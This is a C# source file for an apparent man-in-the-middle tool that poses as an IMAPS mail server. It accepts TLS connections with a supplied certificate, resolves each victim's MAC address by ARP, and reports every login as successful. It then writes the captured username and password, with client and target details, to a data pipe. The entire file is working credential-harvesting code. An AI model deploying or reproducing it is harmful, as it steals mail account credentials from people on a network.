using System;
using System.Configuration;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Collections;

using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;


namespace IMAP4SReverseProxyServer
{
  class IMAP4SReverseProxy
  {
    [System.Runtime.InteropServices.DllImport("Iphlpapi.dll", EntryPoint = "SendARP")]
    internal extern static Int32 SendArp(Int32 destIpAddress, Int32 srcIpAddress, byte[] macAddress, ref Int32 macAddressLength);



    private static readonly IMAP4SReverseProxy cServer = new IMAP4SReverseProxy();

    private static int cLocalPort;
    private static int cRemotePort;
    private static String cRemoteHost;
    private static String cRemoteIP;

    private static X509Certificate cServerCertificate = null;

    private TcpListener cListener;
    private Thread cListenerThread;

    private static Hashtable cTargetMACs = new Hashtable();



    /*
     * 
     * 
     */
    public IPAddress ListeningIPInterface
    {
      get { return IPAddress.Any; }
    }
    public int ListeningPort
    {
      get { return cLocalPort; }
    }





    /*
     * 
     * 
     */
    public static IMAP4SReverseProxy Server
    {
      get { return cServer; }
    }




    /*
     * 
     * 
     */
    public bool Start(int pLocalPort, String pRemoteHost, int pRemotePort, String pRedirectURL, String pCertificatePath)
    {
      cLocalPort = pLocalPort;
      cRemoteHost = pRemoteHost;
      cRemotePort = pRemotePort;

      /*
       * Determine remote IP
       */
      IPHostEntry lHostEntry;
      lHostEntry = Dns.GetHostEntry(cRemoteHost);

      if (lHostEntry.AddressList.Length > 0)
        cRemoteIP = lHostEntry.AddressList[0].ToString();
      else
        cRemoteIP = "0.0.0.0";

      if (Program.cDebuggingOn)
        Console.WriteLine("Start(0) : remote system {0}/{1}", cRemoteHost, cRemoteIP);


      /*
       * Start listener
       */
      cListener = new TcpListener(ListeningIPInterface, cLocalPort);

      try
      {
        cServerCertificate = new X509Certificate2(pCertificatePath, "");
        cListener.Start();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        return (false);
      }

      cListenerThread = new Thread(new ParameterizedThreadStart(HandleIMAP4SClient));
      cListenerThread.Start(cListener);

      return (true);
    }




    /*
     * 
     * 
     */
    public void Stop()
    {
      cListener.Stop();

      //wait for server to finish processing current connections...
      cListenerThread.Abort();
      cListenerThread.Join();
      cListenerThread.Join();
    }




    /*
     * 
     * 
     */
    private static void HandleIMAP4SClient(Object obj)
    {
      TcpListener lListener = (TcpListener)obj;
      try
      {
        while (true)
        {
          TcpClient lClient = lListener.AcceptTcpClient();
          while (!ThreadPool.QueueUserWorkItem(new WaitCallback(IMAP4SReverseProxy.ProcessClient), lClient)) ;
        }
      }
      catch (ThreadAbortException) { }
      catch (SocketException) { }
    }



    /*
     * 
     * 
     */
    private static void ProcessClient(Object pObj)
    {
      TcpClient lTCPClient = (TcpClient) pObj;
      Stream lClientStream = lTCPClient.GetStream();
      SslStream lSSLStream = new SslStream(lClientStream, true);
      String lClientIP = String.Empty;
      String lClientPort = String.Empty;
      String lClientMAC = String.Empty;

if (Program.cDebuggingOn)
  Console.WriteLine(String.Format("ProcessClient(): Start"));


      // Set timeouts for the read and write to 5 seconds.
      lSSLStream.ReadTimeout = 15000;
      lSSLStream.WriteTimeout = 15000;

      /*
       * Determine client IP and MAC address.
       */
      try
      {
        char lDelim = new char();
        lDelim = ':';
        String[] lWords = lTCPClient.Client.RemoteEndPoint.ToString().Split(lDelim);
        lClientIP = lWords[0];
        lClientPort = lWords[1];
      }
      catch (Exception lEx)
      {
        if (Program.cDebuggingOn)
          Console.WriteLine("ProcessClient() : {0}\r\n{1}", lEx.Message, lEx.StackTrace);
      }


      try
      {
        lClientMAC = GetMACFromNetworkComputer(lClientIP);
      }
      catch (Exception)
      {
        lClientMAC = "00:00:00:00:00:00";
      }



      /*
       *  Process request.
       */
      try
      {
        lSSLStream.AuthenticateAsServer(cServerCertificate, false, SslProtocols.Tls | SslProtocols.Ssl3 | SslProtocols.Ssl2, false);
        DoIMAP4SProcessing(lClientMAC, lClientIP, lClientPort, lSSLStream);
      }
      catch (Exception lEx)
      {
        Console.WriteLine(String.Format("ERROR: {0}\r\n{1}", lEx.Message, lEx.StackTrace));
        return;
      }
      finally
      {
        lTCPClient.Close();
      }
    }




    /*
     * 
     * 
     */
    private static void DoIMAP4SProcessing(String pSrcMAC, String pSrcIP, String pSrcPort, Stream pClientStream)
    {
      Stream lOutStream = pClientStream;
      StreamReader lClientStreamReader = new StreamReader(pClientStream);
      String lIMAP4SCommand = String.Empty;
      Byte[] lClientRequest = new Byte[256];
      String lFuncRetVal = String.Empty;
      String lUsername = String.Empty;
      String lPassword = String.Empty;

      lClientRequest = System.Text.Encoding.ASCII.GetBytes("+OK Server ready.\r\n");
      pClientStream.Write(lClientRequest, 0, lClientRequest.Length);


      try
      {        
        do
        {
          // Read IMAP4S command line
          lIMAP4SCommand = lClientStreamReader.ReadLine();

          if (Program.cDebuggingOn)
            Console.WriteLine(String.Format("DoIMAP4SProcessing(): Request command: \"{0}\"", lIMAP4SCommand));

          lFuncRetVal = ProcessRequest(ref lIMAP4SCommand, ref lUsername, ref lPassword);

          if (Program.cDebuggingOn)
            Console.WriteLine(String.Format("DoIMAP4SProcessing(): response: \"{0}\"", lFuncRetVal));

          lClientRequest = System.Text.Encoding.ASCII.GetBytes(lFuncRetVal + "\r\n");
          pClientStream.Write(lClientRequest, 0, lClientRequest.Length);


          /*
           * Send account data to data pipe
           */
          if (!String.IsNullOrEmpty(lUsername) && !String.IsNullOrEmpty(lPassword))
          {
            try
            {
              String lPipeData = String.Format("TCP||{0}||{1}||{2}||{3}||{4}||{5}||{6}||{7}\r\n", pSrcMAC, pSrcIP, pSrcPort, cRemoteIP, cRemotePort, lUsername, lPassword, cRemoteHost);
              Program.WriteToPipe(lPipeData);

              lUsername = String.Empty;
              lPassword = String.Empty;

              if (Program.cDebuggingOn)
                Console.WriteLine(lPipeData.TrimEnd());
            }
            catch (Exception lEx)
            {
              Console.WriteLine(String.Format("Error occurred: {0}\r\n{1}", lEx.Message, lEx.StackTrace));
            }
          } // if (!String.IsNullOrEmpty(cR...



          /*
           * Logout
           */
          if (!String.IsNullOrEmpty(lIMAP4SCommand) && lIMAP4SCommand.Trim().ToLower().StartsWith("logout"))
            break;

        } while (true);
      }
      catch (Exception lEx)
      {
        if (Program.cDebuggingOn)
          Console.WriteLine(String.Format("ERROR: {0}\r\n{1}", lEx.Message, lEx.StackTrace));

        return;
      }
      finally
      {
        if (lClientStreamReader != null)
          lClientStreamReader.Close();

        if (pClientStream != null)
          pClientStream.Close();

        if (lOutStream != null)
          lOutStream.Close();
      }
    }


    /*
     * 
     * 
     */
    private static String ProcessRequest(ref String pRequest, ref String pUsername, ref String pPassword)
    {
      String lRetVal = String.Format("* BAD - command unknown or arguments invalid\r\n");

      if (!String.IsNullOrEmpty(pRequest) && !String.IsNullOrWhiteSpace(pRequest))
      {
        String lRequest = pRequest.ToLower();
        Match lMatch = Regex.Match(pRequest, @"^([\w\d]+)\s+([^\s]+)\s{0,}(.+)?", RegexOptions.IgnoreCase);

        if (lMatch.Success)
        {
          String lID = lMatch.Groups[1].Value;
          String lCommand = lMatch.Groups[2].Value;
          String lParams = lMatch.Groups[3].Value;

          Console.WriteLine(String.Format("id: {0}, command: {1}, params: {2}", lID, lCommand, lParams));
          if (!String.IsNullOrEmpty(lID) && !String.IsNullOrEmpty(lCommand))
          {
            pRequest = lCommand;

            /*
             * Capability
             */
            if (lCommand == "capability")
            {
              lRetVal = String.Format("* CAPABILITY IMAP4rev1 UNSELECT IDLE NAMESPACE QUOTA ID XLIST CHILDREN X-GM-EXT-1 XYZZY SASL-IR AUTH=LOGIN AUTH=PLAIN AUTH=CRAM-MD5 AUTH=DIGEST-MD5\r\n");
              lRetVal = String.Format("{0}{1} OK Thats all she wrote!\r\n", lRetVal, lID);
            }

            /*
             * Login
             */
            else if (lCommand == "login")
            {
              lRetVal = String.Format("* CAPABILITY IMAP4rev1 UNSELECT IDLE NAMESPACE QUOTA ID XLIST CHILDREN X-GM-EXT-1 XYZZY SASL-IR AUTH=LOGIN AUTH=PLAIN AUTH=CRAM-MD5 AUTH=DIGEST-MD5\r\n");
              lRetVal = String.Format("{0}{1} OK Login completed\r\n", lRetVal, lID);
              String[] lSplitter = lParams.Split(new char[] { ' ', '\t' });
              pUsername = lSplitter[0];
              pPassword = lSplitter[1];
            }

            /*
             * Logout
             */
            else if (lCommand == "logout")
            {
              lRetVal = String.Format("* BYE IMAP4 server terminating connection\r\n");
              lRetVal = String.Format("{0}{1} OK Logout completed\r\n", lRetVal, lID);
            } // if (lComma...

          } // if (!String.IsN...
        } // if (lMatch... 
      } // if (!Stri...

      return (lRetVal);
    }



    /*
     * 
     * 
     */
    private static String GetMACFromNetworkComputer(String pClientIP)
    {
      String lRetVal = String.Empty;
      Int32 lConvertedIPAddr = 0;
      byte[] lMACArray;
      int lByteArrayLen = 0;
      int lARPReply = 0;
      IPAddress lIPAddress = null;


      /*
       * First check the local cache if IP/MAC entry exists.
       */
      if (cTargetMACs.ContainsKey(pClientIP))
        return (cTargetMACs[pClientIP].ToString());


      /*
       * Target MAC is not in local cache. Send ARP request. 
       */
      lIPAddress = IPAddress.Parse(pClientIP);

      if (lIPAddress.AddressFamily != AddressFamily.InterNetwork)
        throw new ArgumentException("The remote system only supports IPv4 addresses");

      lConvertedIPAddr = ConvertIPToInt32(lIPAddress);
      lMACArray = new byte[6]; // 48 bit
      lByteArrayLen = lMACArray.Length;

      if ((lARPReply = SendArp(lConvertedIPAddr, 0, lMACArray, ref lByteArrayLen)) != 0)
        throw new Exception(String.Format("Error no. {0} occured while resolving MAC address of system {1}",
                                           lARPReply, pClientIP));


      //return the MAC address in a PhysicalAddress format
      for (int i = 0; i < lMACArray.Length; i++)
      {
        lRetVal += String.Format("{0}", lMACArray[i].ToString("X2"));
        lRetVal += (i != lMACArray.Length - 1) ? "-" : "";
      } // for (in...

      // Add IP/MAC to cache.
      cTargetMACs.Add(pClientIP, lRetVal);

      return (lRetVal);
    }




    /*
     * 
     * 
     */
    private static Int32 ConvertIPToInt32(IPAddress pIPAddr)
    {
      byte[] lByteAddress = pIPAddr.GetAddressBytes();
      return BitConverter.ToInt32(lByteAddress, 0);
    }


  }
}
